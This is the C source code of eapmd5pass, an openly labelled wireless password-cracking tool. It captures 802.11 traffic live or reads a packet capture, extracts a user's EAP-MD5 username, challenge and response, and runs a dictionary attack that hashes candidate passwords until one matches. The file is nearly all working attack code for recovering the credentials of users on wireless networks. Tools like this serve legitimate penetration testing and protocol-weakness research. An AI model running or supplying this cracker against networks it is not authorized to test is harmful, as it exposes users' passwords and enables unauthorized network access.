/* Copyright (c) 2007, Joshua Wright <jwright@hasborg.com>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation. See COPYING for more
 * details.
 *
 * This software is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <signal.h>

#include <openssl/md5.h>
#include <pcap.h>

#include "radiotap.h"
#include "utils.h"
#include "byteswap.h"
#include "eapmd5pass.h"
#include "ieee80211.h"
#include "ieee8021x.h"
#include "ietfproto.h"

/* pcap descriptor */
pcap_t *p = NULL;
struct pcap_pkthdr *h;
uint8_t *dot11packetbuf;
int __verbosity=0;
int offset=0; /* Offset of pcap data to beginning of frame */
long pcount=0; /* Total number of packets observed */
struct eapmd5pass_data em;

void cleanexit()
{
	if (p != NULL) {
		pcap_close(p);
	}

	if (em.recovered_pass > 0) {
		exit(0);
	} else {
		exit(1);
	}
}

void usage(char *message)
{

    if (strlen(message) > 0) {
        fprintf(stderr, "ERROR: %s\n", message);
    }
	printf("\nUsage: eapmd5pass [ -i <int> | -r <pcapfile> ] [ -w wordfile ] [options]\n");
	printf("\n");
	printf("  -i <iface>\tinterface name\n");
	printf("  -r <pcapfile>\tread from a named libpcap file\n");
	printf("  -w <wordfile>\tuse wordfile for possible passwords.\n");
	printf("  -b <bssid>\tBSSID of target network (default: all)\n");
	printf("  -U <username>\tUsername of EAP-MD5 user.\n");
	printf("  -C <chal>\tEAP-MD5 challenge value.\n");
	printf("  -R <response>\tEAP-MD5 response value.\n");
	printf("  -E <eapid>\tEAP-MD5 response EAP ID value.\n");
	printf("  -v\t\tincrease verbosity level (max 3)\n");
	printf("  -V\t\tversion information\n");
	printf("  -h\t\tusage information\n");

	printf("\nThe \"-r\" and \"[-U|-C|-R|-E]\" options are not meant to be "
			"used together.  Use -r\nwhen a packet capture is "
			"available.  Specify the username, challenge and\n"
			"response when available through other means.\n");
}

/* Determine radiotap data length (including header) and return offset for the
beginning of the 802.11 header */
int radiotap_offset(pcap_t *p, struct pcap_pkthdr *h)
{

	struct ieee80211_radiotap_header *rtaphdr;
	int rtaphdrlen=0;

	/* Grab a packet to examine radiotap header */
	if (pcap_next_ex(p, &h, (const u_char **)&dot11packetbuf) > -1) {

		rtaphdr = (struct ieee80211_radiotap_header *)dot11packetbuf;
		rtaphdrlen = le16_to_cpu(rtaphdr->it_len); /* rtap is LE */

		/* Sanity check on header length */
		if (rtaphdrlen > (h->len - DOT11HDR_MINLEN)) {
			return -2; /* Bad radiotap data */
		}

		return rtaphdrlen;
	}

	return -1;
}

void assess_packet(char *user, struct pcap_pkthdr *h, u_int8_t *pkt)
{

	struct dot11hdr *dot11;
	struct ieee8021x *dot1xhdr;
	struct ieee8022 *dot2hdr;
	struct eap_hdr *eaphdr;
	uint8_t *bssidaddrptr;
	int plen, poffset;
	struct eapmd5pass_data *em;
	extern long pcount;

	em = (struct eapmd5pass_data *)user;

	if (offset < 0)
		return;

	/* Check minimum packet length */
	if (offset + sizeof(struct dot11hdr) > h->caplen)
		return;

	pcount++; /* Global packet counter */
	if (__verbosity > 2) {
		printf("Checking Frame: %ld....\n",pcount);
	}

	poffset = offset;
	plen = h->len - offset;
	if (plen > DOT11HDR_A3_LEN) {
		dot11 = (struct dot11hdr *)(pkt+offset);
	} else {
		if (__verbosity > 1) {
			printf("\tDiscarding too-small frame (%d).\n", plen);
		}
		return;
	}

	if (dot11->u1.fc.from_ds == 1 && dot11->u1.fc.to_ds == 1) {
		/* Ignore WDS frames */
		if (__verbosity > 2) {
			printf("\tDiscarding WDS frame.\n");
		}
		return;
	} else if (dot11->u1.fc.from_ds == 1 && dot11->u1.fc.to_ds == 0) {
		/* From the DS */
		bssidaddrptr = dot11->addr2;
	} else if (dot11->u1.fc.from_ds == 0 && dot11->u1.fc.to_ds == 1) {
		/* To the DS, interesting to us */
		bssidaddrptr = dot11->addr1;
	} else { /* fromds = 0, tods = 0 */
		/* Ad-hoc, can this be used with PEAP? */
		bssidaddrptr = dot11->addr3;
	}

	if (dot11->u1.fc.type != DOT11_FC_TYPE_DATA) {
		if (__verbosity > 2) {
			printf("\tDiscarding frame, not type data.\n");
		}
		return;
	}

	/* Discard traffic for other BSSID's if one was specified; otherwise,
	   all networks are fair game. */
	if (em->bssidset) {
		if (memcmp(em->bssid, bssidaddrptr, IEEE802_MACLEN) != 0) {
			return;
		}
	}

	poffset += DOT11HDR_A3_LEN;
	plen -= DOT11HDR_A3_LEN;

	if (dot11->u1.fc.subtype == DOT11_FC_SUBTYPE_QOSDATA) {
		/* Move another 2 bytes past QoS header */
		poffset += DOT11HDR_QOS_LEN;
		plen -= DOT11HDR_QOS_LEN;
	} else if (dot11->u1.fc.subtype != DOT11_FC_SUBTYPE_DATA) {
		if (__verbosity > 2) {
			printf("\tDiscarding frame, not-applicable subtype: "
					"%02x.\n", dot11->u1.fc.subtype);
		}
		return;
	}

	if (plen <= 0) {
		if (__verbosity > 2) {
			printf("\tDiscarding frame with no payload.\n");
		}
		return;
	}


	/* IEEE 802.2 header */
	dot2hdr = (struct ieee8022 *)(pkt+poffset);
	poffset += DOT2HDR_LEN;
	plen -= DOT2HDR_LEN;

	if (poffset + sizeof(struct ieee8022) > h->caplen)
		return;

	if (plen <= 0) {
		if (__verbosity > 2) {
			printf("\tDiscarding frame with partial 802.2 header.\n");
		}
		return;
	}

	/* Check 802.2 header for embedded IEEE 802.1x authentication */
	if (dot2hdr->dsap != IEEE8022_SNAP || dot2hdr->ssap != IEEE8022_SNAP) {
		if (__verbosity > 2) {
			printf("\tDiscarding frame, invalid 802.2 header.\n");
		}
		return;
	}
	if (ntohs(dot2hdr->type) != IEEE8022_TYPE_DOT1X) {
		if (__verbosity > 2) {
			printf("\tDicarding frame, embedded protocol is not "
					"IEEE 802.1x (%04x).\n", dot2hdr->type);
		}
		return;
	}


	/* IEEE 802.1x header */
	dot1xhdr = (struct ieee8021x *)(pkt + poffset);
	plen -= DOT1XHDR_LEN;
	poffset += DOT1XHDR_LEN;

	if (plen <= 0) {
		if (__verbosity > 2) {
			printf("\tDiscarding frame, too short for 802.1x (%d).\n",
					h->len - offset);
		}
		return;
	}

	if (dot1xhdr->version != DOT1X_VERSION1 && 
			dot1xhdr->version != DOT1X_VERSION2) {
		if (__verbosity > 2) {
			printf("\tDiscarding frame, not an 802.1x packet.\n");
		}
		return;
	}

	if (dot1xhdr->type != DOT1X_TYPE_EAP) {
		if (__verbosity > 2) {
			printf("\tDiscarding frame, not an EAP packet.\n");
		}
		return;
	}

	/* EAP header contents */
	eaphdr = (struct eap_hdr *)(pkt + poffset);

	if ((plen - EAPHDR_MIN_LEN) < 0) {
		if (__verbosity > 2) {
			printf("\tDiscarding frame, too short for EAP (%d).\n",
					h->len - offset);
		}
		return;
	}

	if (eaphdr->type != EAP_TYPE_ID && eaphdr->type != EAP_TYPE_MD5 &&
			eaphdr->type != EAP_TYPE_EAP) {
		if (__verbosity > 2) {
			printf("\tDiscarding frame, not EAP Identification or "
					"EAP-MD5.\n");
		}
		return;
	}

	/* Try to extract username */
	if (dot11->u1.fc.from_ds == 0 && dot11->u1.fc.to_ds == 1 &&
			eaphdr->type == EAP_TYPE_ID) {
		if (extract_eapusername((pkt+poffset), plen, em) == 0) {
			if (__verbosity > 2) {
				printf("\tFound Username!\n");
			}
			em->namefound=1;
			return;
		}
	}

	/* Try to extract the challenge */
	if (dot11->u1.fc.from_ds == 1 && dot11->u1.fc.to_ds == 0 &&
			eaphdr->type == EAP_TYPE_MD5 &&
			em->namefound == 1 &&
			em->chalfound == 0) {
		if (extract_eapchallenge((pkt+poffset), plen, em) == 0) {
                        if (__verbosity > 2) {
                                printf("\tFound Challenge!\n");
                        }

			em->chalfound = 1;
			return;
		}
	}

	/* Try to extract the response */
	if (dot11->u1.fc.from_ds == 0 && dot11->u1.fc.to_ds == 1 &&
			eaphdr->type == EAP_TYPE_MD5 &&
			em->namefound == 1 &&
			em->chalfound == 1 &&
			em->respfound == 0) {
		if (extract_eapresponse((pkt+poffset), plen, em) == 0) {
                        if (__verbosity > 2) {
                                printf("\tFound Response!\n");
                        }

			em->respfound = 1;
			return;
		}
	}

	/* Try to extract the success message */
	if (dot11->u1.fc.from_ds == 1 && dot11->u1.fc.to_ds == 0 &&
			em->namefound == 1 &&
			em->chalfound == 1 &&
			em->respfound == 1) {
                        if (__verbosity > 2) {
                                printf("\tFound Possible EAP Success!\n");
                        }

		if (extract_eapsuccess((pkt+poffset), plen, em) == 0) {
			em->succfound = 1;
			printf("Collected all data necessary to attack "
					"password for \"%s\", starting attack."
					"\n", em->username);
			eapmd5_attack(em);
			eapmd5_nexttarget(em);
			return;
		} else {
			if (__verbosity >2) {
				printf("\tCould not confirm EAP Success\n");
			}
		}
	}

	return;
}

void eapmd5_attack(struct eapmd5pass_data *em)
{

	FILE *fp;
	int passlen;
	unsigned long wordcount=0;
	uint8_t digest[16];
	char buf[256];
	struct timeval start, finish;
	int success=0;
	float elapsed=0;

	buf[0] = em->respeapid;

	if (*em->wordfile == '-') {
		fp = stdin;
	} else {
		fp = fopen(em->wordfile, "r");
	}

	if (fp == NULL) {
		perror("fopen");
		pcap_close(p);
		exit(-1);
	}

	gettimeofday(&start, 0);

	while(feof(fp) == 0) {
		if (fgets((buf+1), sizeof(buf)-1, fp) == NULL) {
			fclose(fp);
			break;
		}

		wordcount++;
		passlen = strlen(buf)-1;
		memcpy((buf+passlen), em->challenge, 16);

		MD5((uint8_t *)buf, passlen+16, digest);

		if (memcmp(digest, em->response, 16) == 0) {
			success=1;
			fclose(fp);
			break;
		}

	}

	gettimeofday(&finish, 0);

	if (success == 1) {
		em->recovered_pass++;
		buf[passlen] = 0;
		printf("User password is \"%s\".\n", buf+1);
	} else {
		printf("Unable to idenitfy user password, not in the dictionary"
				" file.\n");
	}
	
	if (finish.tv_usec < start.tv_usec) {
		finish.tv_sec -= 1;
		finish.tv_usec += 1000000;
	}
	finish.tv_sec -= start.tv_sec;
	finish.tv_usec -= start.tv_usec;
	elapsed = finish.tv_sec + finish.tv_usec / 1000000.0;

	printf("%lu passwords in %.2f seconds: %.2f passwords/second.\n",
		wordcount, elapsed, wordcount/elapsed);
	return;
}

void eapmd5_nexttarget(struct eapmd5pass_data *em)
{
	/* Reset tracking values for the next attack */
	em->namefound = 0;
	em->chalfound = 0;
	em->respfound = 0;
	em->succfound = 0;
	return;
}

int extract_eapusername(uint8_t *eap, int len, struct eapmd5pass_data *em)
{
	struct eap_hdr *eaphdr;
	int usernamelen;
	int eaplen;

	eaphdr = (struct eap_hdr *)eap;

	if (eaphdr->code != EAP_RESPONSE) {
		return 1;
	}

	if (eaphdr->type != EAP_TYPE_ID) {
		return 1;
	}

	eaplen = ntohs(eaphdr->length);
	if (eaplen > len) {
		return 1;
	}

	/* 5 bytes for EAP header information without identity information */
	usernamelen = (eaplen - 5);

	if (usernamelen < 0)
		return 1;

	usernamelen = (eaplen > sizeof(em->username)) 
			? sizeof(em->username) : usernamelen;
	memcpy(em->username, (eap+5), usernamelen);
	em->username[usernamelen] = 0;

	return 0;
}

int extract_eapchallenge(uint8_t *eap, int len, struct eapmd5pass_data *em)
{
	struct eap_hdr *eaphdr;
	int eaplen;
	int offset;

	eaphdr = (struct eap_hdr *)eap;

	if (eaphdr->code != EAP_REQUEST) {
		return 1;
	}

	if (eaphdr->type != EAP_TYPE_MD5) {
		return 1;
	}

	eaplen = ntohs(eaphdr->length);
	if (eaplen > len) {
		return 1;
	}

	/* 5th byte offset is the value-size parameter */
	if ((eap[5]) != 16) {
		return 1;
	}

	len -= 6;
	offset = 6;

	if (len <= 0) {
		return 1;
	}

	memcpy(em->challenge, (eap+offset), 16);
	return 0;
}
	

int extract_eapresponse(uint8_t *eap, int len, struct eapmd5pass_data *em)
{
	struct eap_hdr *eaphdr;
	int eaplen;
	int offset;

	eaphdr = (struct eap_hdr *)eap;

	if (eaphdr->code != EAP_RESPONSE) {
		return 1;
	}

	if (eaphdr->type != EAP_TYPE_MD5) {
		return 1;
	}

	eaplen = ntohs(eaphdr->length);
	if (eaplen > len) {
		return 1;
	}

	/* 5th byte offset is the value-size parameter */
	if ((eap[5]) != 16) {
		return 1;
	}

	len -= 6;
	offset = 6;

	if (len <= 0) {
		return 1;
	}

	memcpy(em->response, (eap+offset), 16);
	em->respeapid = eaphdr->identifier;
	return 0;
}

int extract_eapsuccess(uint8_t *eap, int len, struct eapmd5pass_data *em)
{
	struct eap_hdr *eaphdr;

	eaphdr = (struct eap_hdr *)eap;

	if (eaphdr->code == EAP_FAILURE) {
		/* Reset tracking values for next exchange */
		eapmd5_nexttarget(em);
	}

	if (eaphdr->code == EAP_SUCCESS) {
		return 0;
	}

	return 1;
}

/* Called by signal SIGALRM */
void break_pcaploop()
{
	if (__verbosity > 2) {
		printf("Calling pcap_breakloop.\n");
	}
	pcap_breakloop(p);
}



int main(int argc, char *argv[])
{

	char errbuf[PCAP_ERRBUF_SIZE], iface[17], pcapfile[1024];
	int opt=0, datalink=0, ret=0;
	extern struct eapmd5pass_data em;

	memset(&em, 0, sizeof(em));
	memset(pcapfile, 0, sizeof(pcapfile));

	printf("eapmd5pass - Dictionary attack against EAP-MD5\n");
	while ((opt = getopt(argc, argv, "w:r:i:b:U:C:R:E:vVh?")) != -1) {
		switch(opt) {

		case 'i':
			/* Interface name */
			strncpy(iface, optarg, sizeof(iface)-1);
			break;
		case 'w':
			/* word file */
			strncpy(em.wordfile, optarg, sizeof(em.wordfile)-1);
			break;
		case 'r':
			/* Read from pcap file */
			strncpy(pcapfile, optarg, sizeof(pcapfile)-1);
			break;
		case 'b':
			/* BSSID of target network */
			if (str2mac(optarg, em.bssid) != 0) {
				fprintf(stderr, "Error parsing BSSID MAC "
					"address.\n");
				usage("");
				return -1;
			}
			em.bssidset = 1;
			break;
		case 'C':
			if (strlen(optarg) != 47) {
				usage("Incorrect challenge input length "
						"specified.\n");
				exit(1);
			}
			if (str2hex(optarg, em.challenge, 
					sizeof(em.challenge)) < 0) {
				usage("Malformed value specified as "
						"challenge.\n");
				exit(1);
			}
			em.chalfound=1;
			break;
		case 'R':
			if (strlen(optarg) != 47) {
				usage("Incorrect response input length "
						"specified.\n");
				exit(1);
			}
			if (str2hex(optarg, em.response, 
					sizeof(em.response)) < 0) {
				usage("Malformed value specified as "
						"response.\n");
				exit(1);
			}
			em.respfound=1;
			break;
		case 'U':
			strncpy(em.username, optarg, sizeof(em.username)-1);
			em.namefound=1;
			break;
		case 'E':
			em.respeapid=atoi(optarg);
			em.eapid=1;
			break;
		case 'v':
			__verbosity++;
			break;
		case 'V':
			printf("eapmd5pass - 1.5\n");
			return(0);
			break;
		default:
			usage("");
			return(-1);
			break;
		}
	}

	/* Register signal handlers */
	signal(SIGINT, cleanexit);
	signal(SIGTERM, cleanexit);
	signal(SIGQUIT, cleanexit);


	/* Test for minimum number of arguments */
	if (argc < 3) {
		usage("");
		return -1;
	}

	if (strlen(em.wordfile) < 1) {
		usage("Must specify a dictionary file with -w.");
		return -1;
	}

	if (em.namefound && em.chalfound && em.respfound && em.eapid) {
		/* User specified input parameters manually, assume success
		 * and start cracking.
		 */
		em.succfound=1;
		eapmd5_attack(&em);
		return 0;
	}

	if (strlen(pcapfile) > 0) {
		/* User has specified a libpcap file for reading */
		p = pcap_open_offline(pcapfile, errbuf);
	} else {
		p = pcap_open_live(iface, SNAPLEN, PROMISC, TIMEOUT, errbuf);
	}

	if (p == NULL) {
		fprintf(stderr, "Unable to open pcap device\n");
		perror("pcap_open");
		return -1;
	}

	/* Set non-blocking */
	if (!(strlen(pcapfile) > 0) && pcap_setnonblock(p, PCAP_DONOTBLOCK, errbuf) != 0) {
		fprintf(stderr, "Error placing pcap interface in non-blocking "
			"mode.\n");
		perror("pcap_setnonblock");
		pcap_close(p);
		return -1;
	}

	/* Examine header length to determine offset of the 802.11 header */
	datalink = pcap_datalink(p);
	switch(datalink) {
		
		case DLT_IEEE802_11_RADIO: /* Variable length header */
		offset = radiotap_offset(p, h);
		if (offset < sizeof(struct ieee80211_radiotap_header)) {
			fprintf(stderr, "Unable to determine offset from radiotap header (%d).\n", offset);
			usage("");
			goto bailout;
		}
		break;

		case DLT_IEEE802_11:
		offset = DOT11_OFFSET_DOT11;
		break;

		case DLT_TZSP:
		offset = DOT11_OFFSET_TZSP;
		break;

		case DLT_PRISM_HEADER:
		offset = DOT11_OFFSET_PRISMAVS;
		break;

		default:
		fprintf(stderr, "Unrecognized datalink type %d.\n", datalink);
		usage("");
		goto bailout;
	}

	/* Loop for each packet received */
	signal(SIGALRM, break_pcaploop);

	/* We need a different routine for handling read from pcapfile vs. live
	   interface, because pcap_dispatch returns 0 for EOF on pcapfile, or
	   no packets retrieved due to blocking on a live interface */
	if (strlen(pcapfile) > 0) {
		ret = pcap_dispatch(p, PCAP_LOOP_CNT,
				(pcap_handler)assess_packet, (u_char *)&em);
		if (ret != 0) {
			/* Error reading from packet capture file */
			fprintf(stderr, "pcap_dispatch: %s\n", pcap_geterr(p));
			goto bailout;
		}

	} else { /* live packet capture */

		while(1) {
			ret = pcap_dispatch(p, PCAP_LOOP_CNT,
					(pcap_handler)assess_packet, 
					(u_char *)&em);
			if (ret == 0) {
				/* No packets read, sleep and continue */
				usleep(250000);
				continue;
			} else if (ret == -1) {
				fprintf(stderr, "pcap_loop: %s",
						pcap_geterr(p));
				break;
			} else if (ret == -2) {
				/* returned -2, pcap_breakloop called */
				break;
			} else {
				/* Packet retrieved successfully, continue */
				continue;
			}
		}
	}

	if (__verbosity) {
		printf("Total packets observed: %ld\n", pcount);
	}

bailout:

	pcap_close(p);

	if (em.recovered_pass > 0) {
		return 0;
	} else {
		return 1;
	}

}
